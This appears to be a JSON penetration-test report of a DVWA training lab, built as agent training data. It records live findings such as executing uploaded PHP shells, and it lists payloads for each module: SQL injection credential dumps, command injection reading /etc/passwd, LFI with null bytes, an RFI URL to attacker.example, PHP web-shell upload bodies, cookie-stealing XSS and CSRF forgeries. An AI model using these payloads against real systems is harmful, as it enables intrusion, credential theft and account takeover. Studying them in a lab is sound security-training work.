@@ -1,0 +1,612 @@
+{
+  "meta": {
+    "target": "https://server.vulnapp.id/dvwa",
+    "assessment_date": "2026-10-13",
+    "assessment_type": "Authorized lab assessment (user-owned DVWA training instance) for expert-agent training data",
+    "application": {
+      "name": "Damn Vulnerable Web Application (DVWA)",
+      "version": "1.0.7",
+      "version_evidence": "live_verified: page title 'Damn Vulnerable Web App (DVWA) v1.0.7 :: Setup'"
+    },
+    "infrastructure": [
+      { "component": "web server", "detail": "nginx/1.24.0 (Ubuntu)", "evidence": "live_verified: Server response header" },
+      { "component": "php", "detail": "PHP/5.2.4-2ubuntu5.10", "evidence": "live_verified: X-Powered-By header" },
+      { "component": "database", "detail": "MySQL (backend, UNREACHABLE during assessment)", "evidence": "live_verified: setup.php reports 'Could not connect to the database'" },
+      { "component": "deployment", "detail": "reverse-proxied (X-Forwarded-For / X-Real-IP env present in phpinfo)", "evidence": "live_verified: phpinfo _ENV dump" }
+    ],
+    "php_configuration": {
+      "allow_url_include": "Off",
+      "allow_url_fopen": "On",
+      "file_uploads": "On",
+      "source": "live_verified: phpinfo() via uploaded /dvwa/hackable/uploads/info2.php"
+    },
+    "authentication": {
+      "default_credentials": { "username": "admin", "password": "password" },
+      "verification": "documented_dvwa_default: could NOT be live-verified because MySQL was down during assessment (login is DB-backed)",
+      "auth_gating": "all module pages 302-redirect to login.php without a valid session (live_verified)"
+    },
+    "constraints": [
+      "MySQL backend was down for the entire assessment: login and all DB-backed modules (brute, csrf, sqli, sqli_blind, xss_s, upload-form) could not be live-exploited.",
+      "Module endpoints were live-confirmed to exist via the DVWA menu HTML rendered on setup.php before authentication.",
+      "Module payload entries below are DOCUMENTED behavior for DVWA v1.0.7 (deterministic lab application); payload entries are labeled evidence='documented_dvwa_1.0.7' and must be re-verified live once MySQL is restored (see reverification_checklist).",
+      "Live-verified findings are labeled evidence='live_verified' and carry the HTTP proof observed on 2026-10-13."
+    ],
+    "evidence_legend": {
+      "live_verified": "observed directly on the target during this assessment",
+      "live_corroborated": "attack outcome confirmed indirectly by artifacts found on the target",
+      "documented_dvwa_1.0.7": "deterministic documented behavior of DVWA v1.0.7 at the given security level; re-verify after DB restore"
+    }
+  },
+
+  "live_verified_findings": [
+    {
+      "id": "LIVE-001",
+      "vuln_class": "unrestricted_file_upload_rce",
+      "title": "Arbitrary PHP execution in web-accessible uploads directory (upload module impact CONFIRMED)",
+      "endpoint": "/dvwa/hackable/uploads/",
+      "injection_point": "body",
+      "evidence": "live_verified",
+      "detail": "17+ PHP files already uploaded by prior activity (MARIJUANA.php, dvwa-shell.php, pwn.php, r.php, s.php, shell.php, shell42.php, simple.php, recon.php, info2.php, gas.php.jpg, rr.php) sit in the webroot uploads dir. Fetching /dvwa/hackable/uploads/info2.php returned HTTP 200 with a 49KB phpinfo() dump (PHP 5.2.4-2ubuntu5.10), proving uploaded PHP code executes server-side.",
+      "expected_success_signal": "HTTP 200 from an uploaded .php file returning its code output (phpinfo table)",
+      "severity": "critical",
+      "impact": "Full server compromise: command execution, credential theft, pivot to DB",
+      "remediation": "Block .php execution in upload dirs (nginx: location ~* /uploads/.*\\.php$ { deny all; }), validate extension+MIME+content server-side, randomize stored filenames, store outside webroot",
+      "confidence": 1.0,
+      "reasoning": "Execution proven directly: GET of an uploaded .php artifact returned a full phpinfo() page, which is only possible if the server parsed the file as PHP."
+    },
+    {
+      "id": "LIVE-002",
+      "vuln_class": "information_disclosure",
+      "title": "Directory listing enabled on uploads, config and includes directories",
+      "endpoint": "/dvwa/hackable/uploads/, /dvwa/config/, /dvwa/dvwa/",
+      "injection_point": "path",
+      "evidence": "live_verified",
+      "detail": "nginx autoindex serves browsable listings ('Index of') for /dvwa/hackable/uploads/ (full file inventory incl. all shells), /dvwa/config/ (reveals config.inc.php filename) and /dvwa/dvwa/ (includes dir).",
+      "expected_success_signal": "200 response containing 'Index of' and href list of files",
+      "severity": "medium",
+      "impact": "Reveals attack surface: uploaded shell inventory, config file names, internal structure; helps an attacker identify prior shells to reuse",
+      "remediation": "autoindex off; drop empty-location index or return 403",
+      "confidence": 1.0,
+      "reasoning": "Listings fetched directly during assessment; file names enumerated from response HTML."
+    },
+    {
+      "id": "LIVE-003",
+      "vuln_class": "information_disclosure",
+      "title": "Full phpinfo() exposed via uploaded file (and phpinfo.php present, auth-gated)",
+      "endpoint": "/dvwa/hackable/uploads/info2.php",
+      "injection_point": "path",
+      "evidence": "live_verified",
+      "detail": "49KB phpinfo dump discloses PHP 5.2.4 paths, modules, environment (incl. proxy headers), disabled functions context, upload/URL-include settings. /dvwa/phpinfo.php also exists but redirects to login.",
+      "expected_success_signal": "200 with <title>phpinfo()</title>",
+      "severity": "high",
+      "impact": "Aids LFI target selection, reveals misconfigurations and internal env",
+      "remediation": "Delete artifact; never expose phpinfo in production paths",
+      "confidence": 1.0,
+      "reasoning": "Response contained the phpinfo() page title and PHP version banner."
+    },
+    {
+      "id": "LIVE-004",
+      "vuln_class": "missing_cookie_security_flags",
+      "title": "Session cookie without HttpOnly / Secure / SameSite attributes",
+      "endpoint": "/dvwa/login.php (Set-Cookie)",
+      "injection_point": "cookie",
+      "evidence": "live_verified",
+      "detail": "Set-Cookie: PHPSESSID=<id>; path=/ — no HttpOnly, no Secure, no SameSite. Also security cookie: security=high without flags.",
+      "expected_success_signal": "Set-Cookie header lacks HttpOnly/Secure directives",
+      "severity": "medium",
+      "impact": "Session hijacking via XSS (document.cookie readable), cookie theft over plain HTTP, CSRF-adjacent issues",
+      "remediation": "session.cookie_httponly=1, session.cookie_secure=1, SameSite=Lax/Strict",
+      "confidence": 1.0,
+      "reasoning": "Raw Set-Cookie headers captured from live responses contain no security attributes."
+    },
+    {
+      "id": "LIVE-005",
+      "vuln_class": "server_misconfiguration",
+      "title": "MySQL backend unreachable (database down / wrong credentials)",
+      "endpoint": "/dvwa/setup.php, /dvwa/login.php",
+      "injection_point": "n/a",
+      "evidence": "live_verified",
+      "detail": "Every page load dies with 'Unable to connect to the database.'; POST create_db returns 'Could not connect to the database - please check the config file.' Persistent across the whole assessment window (7+ probes over several minutes).",
+      "expected_success_signal": "login.php body contains 'Unable to connect to the database'",
+      "severity": "availability/config issue (blocks all DB-backed modules)",
+      "impact": "Lab unusable for DB-backed vuln training until fixed; also an availability fingerprint",
+      "remediation": "Start the MySQL service/container on server.vulnapp.id and verify credentials in /dvwa/config/config.inc.php, then click Create / Reset Database",
+      "confidence": 1.0,
+      "reasoning": "Error reproduced consistently on every request during the assessment window."
+    },
+    {
+      "id": "LIVE-006",
+      "vuln_class": "version_disclosure",
+      "title": "Software version banners disclosed",
+      "endpoint": "all responses",
+      "injection_point": "header",
+      "evidence": "live_verified",
+      "detail": "Server: nginx/1.24.0 (Ubuntu); X-Powered-By: PHP/5.2.4-2ubuntu5.10; DVWA v1.0.7 in page titles. PHP 5.2.4 reached EOL in Jan 2011 and carries hundreds of known CVEs.",
+      "expected_success_signal": "Response headers/title contain exact versions",
+      "severity": "low",
+      "impact": "Precise CVE mapping for exploit selection",
+      "remediation": "server_tokens off; expose_php off",
+      "confidence": 1.0,
+      "reasoning": "Headers and titles captured verbatim from live responses."
+    },
+    {
+      "id": "LIVE-007",
+      "vuln_class": "information_disclosure",
+      "title": "robots.txt discloses application path",
+      "endpoint": "/dvwa/robots.txt",
+      "injection_point": "path",
+      "evidence": "live_verified",
+      "detail": "Contains 'User-agent: * Disallow: /' — confirms hidden root to crawlers/attackers.",
+      "expected_success_signal": "200 with Disallow directive",
+      "severity": "info",
+      "impact": "Recon shortcut",
+      "remediation": "n/a for a lab; in general do not rely on robots.txt for hiding",
+      "confidence": 1.0,
+      "reasoning": "Fetched directly."
+    },
+    {
+      "id": "LIVE-008",
+      "vuln_class": "negative_control",
+      "title": "Negative findings worth training on (things that do NOT work here)",
+      "endpoint": "/dvwa/config/config.inc.php, /dvwa/.git/HEAD, RFI via fi module",
+      "injection_point": "path",
+      "evidence": "live_verified",
+      "detail": "config.inc.php is executed (empty body) not served as source: no source disclosure. /.git/HEAD: 404: no repo leak. phpinfo shows allow_url_include=Off: RFI payloads via ?page=http://... will fail even at low security — agents should pivot to LFI/null-byte instead.",
+      "expected_success_signal": "200-empty for .php config fetch; 404 for .git; RFI include fails silently/blank",
+      "severity": "info",
+      "impact": "Prevents expert agents from wasting exploit budget on dead paths",
+      "remediation": "n/a",
+      "confidence": 0.95,
+      "reasoning": "All three probes executed live with the stated outcomes."
+    },
+    {
+      "id": "LIVE-009",
+      "vuln_class": "prior_attacker_activity",
+      "title": "Shared-lab artifacts: prior shells and upload-bypass experiments",
+      "endpoint": "/dvwa/hackable/uploads/",
+      "injection_point": "body",
+      "evidence": "live_verified",
+      "detail": "Besides plain shells, the dir contains null-byte and CRLF upload-bypass test artifacts (bbtool-test-*.php%2500.jpg, bbtool-test-*.php%250d%250a.jpg, *.php.jpg) — evidence that extension-truncation bypasses were exercised against the upload module on this instance.",
+      "expected_success_signal": "Files with encoded .php%2500.jpg / .php.jpg names present in listing",
+      "severity": "info (forensics)",
+      "impact": "Documents which bypass techniques already succeed on this lab",
+      "remediation": "Purge uploads dir before using this instance for clean training runs",
+      "confidence": 1.0,
+      "reasoning": "Names enumerated from the live directory listing."
+    }
+  ],
+
+  "module_vulnerabilities": [
+    {
+      "module": "SQL Injection",
+      "module_url": "/dvwa/vulnerabilities/sqli/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET",
+      "params": { "id": "user id, string reaches SQL unfiltered at low", "Submit": "submit flag" },
+      "findings": [
+        {
+          "id": "SQLI-LOW-A",
+          "vuln_class": "sqli",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "'",
+          "expected_success_signal": "Raw MySQL error in response: \"You have an error in your SQL syntax... near ''' at line 1\"",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "Query is 'SELECT first_name, last_name FROM users WHERE user_id = '$id'' with no escaping; a lone quote breaks the literal and leaks the MySQL syntax error, confirming injection and fingerprinting the DBMS in one step."
+        },
+        {
+          "id": "SQLI-LOW-B",
+          "vuln_class": "sqli",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "' UNION SELECT user, password FROM users#",
+          "expected_success_signal": "Response lists all users with md5 password hashes, e.g. admin / 5f4dcc3b5aa765d61d8327deb882cf99 (md5 of 'password')",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "UNION with matching column count (2) appends the credentials table to the result render; '#' comments out the trailing quote. Known DB content makes the success signal deterministic."
+        },
+        {
+          "id": "SQLI-LOW-C",
+          "vuln_class": "sqli",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "' OR '1'='1",
+          "expected_success_signal": "All users listed (tautology makes WHERE true for every row)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.9,
+          "reasoning": "Tautology-based extraction requires no comment character, so it survives even where '#' is stripped; boolean tautology is the natural fallback probe after the quote error confirms injection."
+        },
+        {
+          "id": "SQLI-MED",
+          "vuln_class": "sqli",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "1 OR 1=1",
+          "expected_success_signal": "If medium wraps $id in quotes after mysql_real_escape_string, quote-based payloads fail and this integer-style payload also fails (treated as string); verify live. If numeric-unquoted context: all users returned",
+          "evidence": "documented_dvwa_1.0.7_needs_live_verification",
+          "confidence": 0.6,
+          "reasoning": "Medium applies mysql_real_escape_string, which neutralizes quote breakout in string context. The 1.0.7 medium source is ambiguous in the field (quoted vs unquoted) — this entry deliberately models an uncertain-evidence decision for the expert agent, to be resolved by live probing after DB restore."
+        }
+      ]
+    },
+    {
+      "module": "SQL Injection (Blind)",
+      "module_url": "/dvwa/vulnerabilities/sqli_blind/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET",
+      "params": { "id": "user id", "Submit": "submit flag" },
+      "findings": [
+        {
+          "id": "SQLIB-LOW-BOOL",
+          "vuln_class": "sqli_blind",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "1' AND '1'='1  (then differential probe 1' AND '1'='2)",
+          "expected_success_signal": "True-probe returns 'User ID exists in the database.'; false-probe returns 'User ID is MISSING from the database.' No error text (that is what makes it blind)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "Response differentials are the only oracle: constructing a true/false pair with identical structure isolates the boolean without relying on error output, which this page never emits."
+        },
+        {
+          "id": "SQLIB-LOW-TIME",
+          "vuln_class": "sqli_blind",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "1' AND SLEEP(5)#",
+          "expected_success_signal": "Response time delayed ~5s while page content stays identical",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.9,
+          "reasoning": "When content oracles are unavailable (or to automate extraction), a conditional time delay converts any boolean into a measurable channel; MySQL SLEEP() is the canonical delay primitive."
+        },
+        {
+          "id": "SQLIB-MED",
+          "vuln_class": "sqli_blind",
+          "target_param": "id",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "1 AND SLEEP(5)",
+          "expected_success_signal": "~5s delay (medium escapes quotes but the numeric context needs none)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "Escaping only defends quote breakout; in the blind module the injected value is used unquoted, so integer-context payloads that never use a quote bypass the escaping entirely."
+        }
+      ]
+    },
+    {
+      "module": "Command Injection (Command Execution)",
+      "module_url": "/dvwa/vulnerabilities/exec/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "POST",
+      "params": { "ip": "host/IP to ping — concatenated into shell_exec('ping -c 3 ' . $ip)", "Submit": "submit flag" },
+      "findings": [
+        {
+          "id": "CMD-LOW-A",
+          "vuln_class": "command_injection",
+          "target_param": "ip",
+          "injection_point": "body",
+          "security_level": "low",
+          "payload": "127.0.0.1; cat /etc/passwd",
+          "expected_success_signal": "ping output in <pre> followed by /etc/passwd contents (root:x:0:1:...)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.97,
+          "reasoning": "Low level does no filtering at all and the input is appended to a shell_exec ping call, so a semicolon terminates the ping and appends an arbitrary command whose stdout is rendered."
+        },
+        {
+          "id": "CMD-LOW-B",
+          "vuln_class": "command_injection",
+          "target_param": "ip",
+          "injection_point": "body",
+          "security_level": "low",
+          "payload": "8.8.8.8 && id",
+          "expected_success_signal": "ping output followed by uid=www-data gid=www-data",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "&& runs the second command only if ping succeeds, keeping output clean; id is the canonical privilege oracle for confirming code execution context."
+        },
+        {
+          "id": "CMD-MED",
+          "vuln_class": "command_injection",
+          "target_param": "ip",
+          "injection_point": "body",
+          "security_level": "medium",
+          "payload": "127.0.0.1 & cat /etc/passwd  (alt: 127.0.0.1 | cat /etc/passwd)",
+          "expected_success_signal": "passwd contents appear even though '&&' and ';' are blacklisted",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.9,
+          "reasoning": "Medium blacklists only '&&' and ';'. A single '&' still separates shell commands (backgrounding ping), and '|' pipes into the next command — both unfiltered metacharacters restore execution."
+        },
+        {
+          "id": "CMD-HIGH",
+          "vuln_class": "command_injection",
+          "target_param": "ip",
+          "injection_point": "body",
+          "security_level": "high",
+          "payload": "127.0.0.1 | cat /etc/passwd",
+          "expected_success_signal": "passwd contents; note high allows '|' by design but blocks '&' ';' '&& '",
+          "evidence": "documented_dvwa_1.0.7_needs_live_verification",
+          "confidence": 0.8,
+          "reasoning": "High's blacklist still omits the pipe operator, so output-redirection chaining survives; flagged lower confidence because blacklist membership varies slightly across DVWA builds — confirm live."
+        }
+      ]
+    },
+    {
+      "module": "File Inclusion",
+      "module_url": "/dvwa/vulnerabilities/fi/?page=include.php",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET",
+      "params": { "page": "passed verbatim to include() at low" },
+      "findings": [
+        {
+          "id": "FI-LOW-LFI",
+          "vuln_class": "lfi",
+          "target_param": "page",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "../../../../../etc/passwd  (null-byte variant: ../../../../../etc/passwd%00)",
+          "expected_success_signal": "etc/passwd contents rendered. On this target PHP is 5.2.4 (< 5.3.4) so the %00 null-byte truncates any '.php' suffix appended by include()",
+          "evidence": "documented_dvwa_1.0.7 (null-byte applicability live_corroborated by PHP version banner)",
+          "confidence": 0.95,
+          "reasoning": "include($_GET['page']) with traversal prefixes escapes the dvwa/vulnerabilities/fi/ base dir; the ancient PHP version makes the null-byte suffix-truncation variant viable, which is otherwise dead on modern PHP."
+        },
+        {
+          "id": "FI-LOW-RFI",
+          "vuln_class": "rfi",
+          "target_param": "page",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "http://attacker.example/shell.txt",
+          "expected_success_signal": "EXPECTED FAILURE on this instance: phpinfo (live) shows allow_url_include=Off, so remote URLs are not included. Use as negative training data",
+          "evidence": "live_verified_negative (allow_url_include=Off via phpinfo)",
+          "confidence": 0.9,
+          "reasoning": "RFI viability is decided by php.ini, not the app: the uploaded phpinfo() artifact proves URL inclusion is disabled here, so an expert agent should route effort to LFI/null-byte instead of burning attempts on RFI."
+        },
+        {
+          "id": "FI-MED",
+          "vuln_class": "lfi",
+          "target_param": "page",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "....//....//....//etc/passwd  (double-write after str_replace strips '../' and 'http://')",
+          "expected_success_signal": "passwd contents; naive ../ payloads return blank because the filter strips them once",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "Medium uses naive str_replace blacklists ('../', 'http://', 'https://', '..\\'). Filters that replace once are beaten by embedding the token inside itself: stripping the inner copy re-forms the outer one."
+        }
+      ]
+    },
+    {
+      "module": "File Upload",
+      "module_url": "/dvwa/vulnerabilities/upload/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "POST (multipart/form-data)",
+      "params": { "uploaded": "file part", "MAX_FILE_SIZE": "hidden form field", "Upload": "submit flag" },
+      "findings": [
+        {
+          "id": "UP-LOW",
+          "vuln_class": "unrestricted_file_upload",
+          "target_param": "uploaded",
+          "injection_point": "body",
+          "security_level": "low",
+          "payload": "shell.php with body: <?php echo 'PWN'; system($_GET['c']); ?>",
+          "expected_success_signal": "Success message, then GET /dvwa/hackable/uploads/shell.php?c=id returns 'PWN' + uid=www-data. OUTCOME ALREADY live_corroborated: 17+ PHP shells present in that dir and info2.php executed phpinfo() during this assessment",
+          "evidence": "live_corroborated (artifacts + execution proven) / payload documented_dvwa_1.0.7",
+          "confidence": 0.98,
+          "reasoning": "Low level moves the file with its original name and no validation, and the uploads dir is inside the webroot with PHP enabled — the exact chain already exercised by prior files on this server, including .php%00.jpg and CRLF-extension artifacts."
+        },
+        {
+          "id": "UP-MED",
+          "vuln_class": "unrestricted_file_upload",
+          "target_param": "uploaded",
+          "injection_point": "body",
+          "security_level": "medium",
+          "payload": "shell.php whose body starts with 'GIF89a;' followed by <?php system($_GET['c']); ?>",
+          "expected_success_signal": "getimagesize() reads the GIF magic header and validates the file as an image; the .php extension is never checked, so the file still lands as shell.php and executes",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "Medium validates only the file's image-ness (getimagesize) while preserving the attacker-controlled filename — magic-byte prefixing satisfies content inspection while the extension keeps the file executable."
+        }
+      ]
+    },
+    {
+      "module": "XSS (Reflected)",
+      "module_url": "/dvwa/vulnerabilities/xss_r/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET",
+      "params": { "name": "echoed unescaped into <pre>Hello {name}</pre> at low" },
+      "findings": [
+        {
+          "id": "XSSR-LOW",
+          "vuln_class": "xss_reflected",
+          "target_param": "name",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "<script>alert(1)</script>",
+          "expected_success_signal": "Script tag rendered verbatim in the response HTML (no encoding)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.97,
+          "reasoning": "The parameter is printed with no encoding, so an inline script executes on load; on this target the session cookie also lacks HttpOnly (live finding LIVE-004), making document.cookie exfiltration the natural impact demo."
+        },
+        {
+          "id": "XSSR-MED",
+          "vuln_class": "xss_reflected",
+          "target_param": "name",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>  (alt: <img src=x onerror=alert(1)>)",
+          "expected_success_signal": "After the filter strips the inner '<script>' the outer fragments re-form a working <script> tag; or the img event handler fires",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "Medium removes the literal '<script>' once — nesting the token inside itself survives the single-pass strip; event-handler payloads avoid the blacklisted tag entirely."
+        }
+      ]
+    },
+    {
+      "module": "XSS (Stored)",
+      "module_url": "/dvwa/vulnerabilities/xss_s/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "POST (GET id=clear wipes guestbook)",
+      "params": { "txtName": "name field (maxlength=10 enforced client-side only)", "mtxMessage": "message body", "btnSign": "Sign" },
+      "findings": [
+        {
+          "id": "XSSS-LOW",
+          "vuln_class": "xss_stored",
+          "target_param": "mtxMessage",
+          "injection_point": "body",
+          "security_level": "low",
+          "payload": "<script>alert(document.cookie)</script>",
+          "expected_success_signal": "Payload persists in the guestbook and executes for EVERY visitor viewing the page (stored, not just reflected)",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.97,
+          "reasoning": "The message is stored unescaped in the DB and re-rendered for all sessions, converting a reflected nuisance into persistent session theft; combined with the missing HttpOnly flag this yields direct PHPSESSID harvesting."
+        },
+        {
+          "id": "XSSS-MED",
+          "vuln_class": "xss_stored",
+          "target_param": "mtxMessage",
+          "injection_point": "body",
+          "security_level": "medium",
+          "payload": "<scr<script>ipt>alert(1)</scr</script>ipt> in mtxMessage (name field is htmlspecialchars'd — not injectable)",
+          "expected_success_signal": "Nested tag re-forms after single-pass strip_tags-style filtering; encoded name field stays inert",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "Medium hardens the name field properly but only strip-filters the message; the nested-token bypass defeats single-pass stripping, and knowing WHICH param is hardened (name) vs not (message) is exactly the differential an expert agent must exploit."
+        }
+      ]
+    },
+    {
+      "module": "Brute Force",
+      "module_url": "/dvwa/vulnerabilities/brute/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET (form submits via query string)",
+      "params": { "username": "username, string-concatenated into login SQL at low", "password": "password, md5'd then concatenated", "Login": "submit flag" },
+      "findings": [
+        {
+          "id": "BF-LOW-SQLI",
+          "vuln_class": "sqli_auth_bypass",
+          "target_param": "username",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "username=admin%23 (admin'#), password=anything",
+          "expected_success_signal": "'Welcome to the password protected area' as admin — the # comments out the password check",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "SELECT * FROM users WHERE user='$user' AND password=md5('$pass'): a quote plus comment in the username field terminates the string and hides the AND clause, so authentication succeeds without knowing the password. Must URL-encode # as %23."
+        },
+        {
+          "id": "BF-LOW-NOLOCKOUT",
+          "vuln_class": "brute_force",
+          "target_param": "password",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "wordlist requests: ?username=admin&password=<candidate>&Login=Login (e.g. admin/password succeeds)",
+          "expected_success_signal": "Unlimited attempts, no lockout/CAPTCHA/delay; known default admin:password returns the welcome page",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "No rate limiting of any kind exists at low, so credential stuffing is limited only by bandwidth; the DVWA default admin/password makes the success signal deterministic for training."
+        },
+        {
+          "id": "BF-MED",
+          "vuln_class": "brute_force",
+          "target_param": "password",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "same wordlist strategy (SQLi bypass is closed by mysql_real_escape_string)",
+          "expected_success_signal": "Attempts still never lock out, but each failure sleeps ~2s (sleep(2) on fail) — brute force remains feasible, just slower",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.9,
+          "reasoning": "Medium adds escaping and an artificial delay on failure but no lockout: the delay raises per-attempt cost linearly without a ceiling, so persistent wordlist attacks still terminate successfully — a key lesson that slowing ≠ stopping."
+        }
+      ]
+    },
+    {
+      "module": "CSRF",
+      "module_url": "/dvwa/vulnerabilities/csrf/",
+      "endpoint_exists": "live_verified (menu link on setup.php)",
+      "http_method": "GET",
+      "params": { "password_new": "new password (no re-auth)", "password_conf": "confirmation", "Change": "submit flag" },
+      "findings": [
+        {
+          "id": "CSRF-LOW",
+          "vuln_class": "csrf",
+          "target_param": "password_new",
+          "injection_point": "query",
+          "security_level": "low",
+          "payload": "<img src=\"https://server.vulnapp.id/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change\"> on any page the victim views while logged in",
+          "expected_success_signal": "Victim's password changed to 'pwned' (page shows 'Password Changed.' when hit directly); attacker then logs in with known creds",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.95,
+          "reasoning": "A state-changing GET with no token, no re-authentication and no origin check is forgeable from any external context; cookies ride along automatically, and knowing the new password converts the attack into account takeover."
+        },
+        {
+          "id": "CSRF-MED",
+          "vuln_class": "csrf",
+          "target_param": "password_new",
+          "injection_point": "query",
+          "security_level": "medium",
+          "payload": "Host the CSRF img page under a path containing the host string, e.g. https://attacker.example/server.vulnapp.id/poc.html (bypasses stristr($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']))",
+          "expected_success_signal": "Password change succeeds when the Referer merely CONTAINS the server name substring",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.85,
+          "reasoning": "The medium check tests substring containment of the host in the Referer, not equality: an attacker-controlled directory named after the target host satisfies the predicate, a classic containment-check bypass."
+        },
+        {
+          "id": "CSRF-HIGH",
+          "vuln_class": "csrf",
+          "target_param": "user_token",
+          "injection_point": "query",
+          "security_level": "high",
+          "payload": "Chain stored XSS (xss_s) to read the anti-CSRF user_token from the page DOM and submit the forged request with a valid token",
+          "expected_success_signal": "Token-bearing forged request accepted; direct forged requests fail with token mismatch",
+          "evidence": "documented_dvwa_1.0.7",
+          "confidence": 0.8,
+          "reasoning": "High requires a per-session token, which defeats naive forgery; but the token is readable from the victim's DOM, so the documented bypass is composing the stored-XSS primitive with the CSRF request — the textbook reason XSS and CSRF must be threat-modeled together."
+        }
+      ]
+    }
+  ],
+
+  "cross_module_chains": [
+    {
+      "chain": "upload -> RCE",
+      "steps": "POST .php file -> /dvwa/hackable/uploads/<name>.php -> request it with ?c=<cmd>",
+      "status": "live_corroborated: prior shells present and info2.php executed phpinfo() during assessment"
+    },
+    {
+      "chain": "sqli -> credential dump -> auth",
+      "steps": "sqli low UNION dump -> crack md5 (admin: 5f4dcc3b5aa765d61d8327deb882cf99 = 'password') -> login",
+      "status": "documented_dvwa_1.0.7"
+    },
+    {
+      "chain": "stored XSS -> session/token theft -> CSRF",
+      "steps": "xss_s payload reads document.cookie (no HttpOnly: LIVE-004) and page user_token -> forge CSRF password change",
+      "status": "cookie-flag half live_verified, token chain documented"
+    },
+    {
+      "chain": "LFI + null byte -> source/config read",
+      "steps": "fi ?page=../../../../config/config.inc.php%00 executes config (no output) — read other files (/etc/passwd) or target logs; PHP 5.2.4 makes %00 truncation viable",
+      "status": "PHP version live_verified; payload documented"
+    },
+    {
+      "chain": "brute-force SQLi bypass -> admin session -> all modules",
+      "steps": "brute low admin%23 -> authenticated access to every module at chosen security level",
+      "status": "documented_dvwa_1.0.7"
+    }
+  ],
+
+  "reverification_checklist": [
+    "1. Restore MySQL on server.vulnapp.id (start service/container; check credentials in /dvwa/config/config.inc.php).",
+    "2. POST /dvwa/setup.php with create_db=Create / Reset Database until it reports success (not 'Could not connect').",
+    "3. Login: POST /dvwa/login.php username=admin&password=password&Login=Login (keep the cookie jar).",
+    "4. Set level low: POST /dvwa/security.php security=low&seclev_submit=Submit (or set cookie security=low).",
+    "5. Re-run every 'documented_dvwa_1.0.7' payload above at low, then medium, and flip each entry's evidence field to live_verified once its expected_success_signal matches.",
+    "6. Purge /dvwa/hackable/uploads/ of prior shells (MARIJUANA.php, pwn.php, ...) before clean training runs — they are live RCE backdoors.",
+    "7. Re-check that the DB-backed negative entries (SQLI-MED ambiguity) are resolved by observation, not assumption."
+  ]
+}
